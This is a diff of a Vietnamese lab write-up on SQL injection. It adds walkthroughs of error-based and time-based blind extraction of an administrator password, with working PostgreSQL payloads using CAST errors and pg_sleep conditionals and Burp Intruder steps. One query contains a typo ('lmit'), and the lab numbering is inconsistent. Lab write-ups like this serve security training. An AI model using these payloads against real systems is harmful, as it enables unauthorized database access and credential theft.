@@ -453,7 +453,107 @@ password:11oow2jtpqkl9d44dosf
 
 Và login thành công , chúng ta Solved được Challenge này !
 
-# Lab 14: Blind SQL injection with out-of-band interaction
+# Lab 13: Visible error-based SQL injection
+
+<img width="1139" height="648" alt="image" src="https://github.com/user-attachments/assets/88c381c4-13ac-468b-a9b9-d13024273e94" />
+
+Thử thêm dấu nháy đơn vào sau thì nó báo lỗi cú pháp ra cả màn hình 
+
+<img width="1498" height="809" alt="image" src="https://github.com/user-attachments/assets/75d7c0a0-c0dd-47eb-9134-91983ff89965" />
+
+Biết cần lấy password từ cột password có trong bảng `users` rồi . Tiếp theo chúng ta cần gây ra lỗi in ra màn hình cùng với kết quả truy vấn
+
+Lưu ý ở đây: Cần phải khai thác lỗi về kiểu Logic chứ không thể để nó sai cấu trúc , cú pháp được . Giả sử như , nếu sau where thì bắt buộc phải là những biểu thức so sánh đúng sai chứ không phải là một câu SELECT lấy dữ liệu được . Bởi vì khi vào trong DB thì nó sẽ check cái cấu trúc , cú pháp có hợp lệ hay không trước rồi mới bắt đầu thực hiện lệnh
+
+Lúc đầu mình thử:
+```sql
+' or cast((select password from users where username = 'administrator') as int)=1 -- -
+```
+Nhưng nó lại báo là: 
+
+<img width="1494" height="810" alt="image" src="https://github.com/user-attachments/assets/34d49f0e-ad29-4245-92cf-dddc2803ad0c" />
+
+Rõ ràng là không chặn nháy đơn mà nhỉ ? Sau đó mình thử hex cái `administrator` thành `0x61646d696e6973747261746f72`
+
+<img width="1494" height="498" alt="image" src="https://github.com/user-attachments/assets/b65c8ec5-011a-4536-bbd2-60b5e681556b" />
+
+Thì nó lại báo lỗi như thế . Truy vấn vấn vẫn chưa được thực thi . Khả năng là bị giới hạn ký tự rồi 
+
+Mình thử rút payload 
+```sql
+' or cast((select username from users limit 1) as int)=1 -- -
+```
+<img width="1489" height="523" alt="image" src="https://github.com/user-attachments/assets/3a52ede4-fbb4-4d04-bc41-bfc0153d0245" />
+
+Và được username . Tiếp theo lấy password thôi
+```sql
+' or cast((select password from users limit 1) as int)=1 -- -
+```
+<img width="1491" height="813" alt="image" src="https://github.com/user-attachments/assets/9b4ccf0b-2707-4909-923a-ac888fed7a2c" />
+
+Và password là: `e7humpkff279alar4wod`
+
+<img width="947" height="437" alt="image" src="https://github.com/user-attachments/assets/e66aa0af-402b-4855-894d-78fa3ee9dd69" />
+
+Chúng ta done Challenge này !!
+
+<img width="1467" height="802" alt="image" src="https://github.com/user-attachments/assets/06a270aa-21c6-401e-b373-c6cf6b49364e" />
+
+# Lab 13,14: Blind SQL injection with time delays and information retrieval
+
+<img width="1127" height="717" alt="image" src="https://github.com/user-attachments/assets/55d43005-c5cb-4843-8c54-83d41e941636" />
+
+Theo mô tả của Challenge này thì Web hiển thị ra kết quả của truy vấn và  phản hồi cũng không khác nhau cho dù có hay không có kết quả truy vấn kể cả gây ra lỗi cũng vậy . Phải bypass bằng timebased
+
+Trước tiên mình thử payload:
+```sql
+'or (select case when 1=1 then pg_sleep(10) else pg_sleep(0) end) is null -- -
+```
+Nếu 1=1 thì web ngủ 10s còn không thì load xong ngay lập tức . Mình dùng `is null` phía sau nữa bởi vì sau where phải là các biểu thức so sánh với nhau
+
+Kết quả là 
+
+<img width="1494" height="841" alt="image" src="https://github.com/user-attachments/assets/8ff32f7b-d92c-4131-b295-b30f8c4598be" />
+
+Web nó load trong 10s . 
+
+Độ dài password
+```sql
+'or (select case when length((select password from users where username = 'administrator')) = 1 then pg_sleep(10) else pg_sleep(0) end) is null -- -
+```
+Add to intrusder ,  rồi Add cái số 1 kia và chọn payload type là number . Và Start Attack
+
+<img width="1870" height="828" alt="image" src="https://github.com/user-attachments/assets/bfadc4f1-4aba-49ee-ab27-61b8d1974bca" />
+
+Kết quả chúng ta được 20 kí tự
+
+Tiếp theo câu truy vấn cần để lấy password là
+```sql
+substring((select password from users where lmit 1),1,1) = 'a'
+```
+Thay vào cái khúc `1=1` kia 
+
+Payload cuối cùng:
+```sql
+'or (select case when substring((select password from users limit 1),1,1) = 'a' then pg_sleep(10) else pg_sleep(0) end) is null -- -
+```
+Rồi add to intrusder , add số 1 và chữ `a` như hình bên dưới , chọn Cluster to bomb.
+
+<img width="1920" height="573" alt="image" src="https://github.com/user-attachments/assets/93e72952-093e-4107-8dd2-4625c72800e3" />
+
+Kết quả là: Dựa vào cột `response received` , vì thời gian load là 10s nên những hàng có `10xxx` thì chọn , và cop bỏ vào cho chatgpt sắp xếp cột 3 theo cột 2 là xong 
+
+<img width="1873" height="1015" alt="image" src="https://github.com/user-attachments/assets/c1b32abe-5d5d-47b5-9aab-7b70b91dd253" />
+
+
+`password: ym2yzos5o578xgkuij59`
+
+Chúng ta done Challenge này !!
+<img width="1563" height="730" alt="image" src="https://github.com/user-attachments/assets/f21039eb-013b-4bb7-b60e-da362215bcb8" />
+
+
+
+# Lab 15: Blind SQL injection with out-of-band interaction
 
 <img width="1111" height="819" alt="image" src="https://github.com/user-attachments/assets/62b049a4-4c29-4945-9efe-a93dfb795e75" />
 
